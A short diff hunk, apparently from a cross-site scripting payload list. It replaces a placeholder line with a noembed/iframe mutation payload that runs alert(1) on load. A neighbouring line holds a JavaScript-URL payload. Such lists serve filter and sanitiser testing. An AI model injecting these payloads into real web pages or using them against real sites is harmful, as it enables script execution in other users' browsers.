@@ -21,7 +21,7 @@ JavaScript://%250Aalert?.(1)//
 ```
 ###
 ```
-lol
+<noembed><img src="</noembed><iframe onload=alert(1)>" /></noembed>
 ```
 
 ###
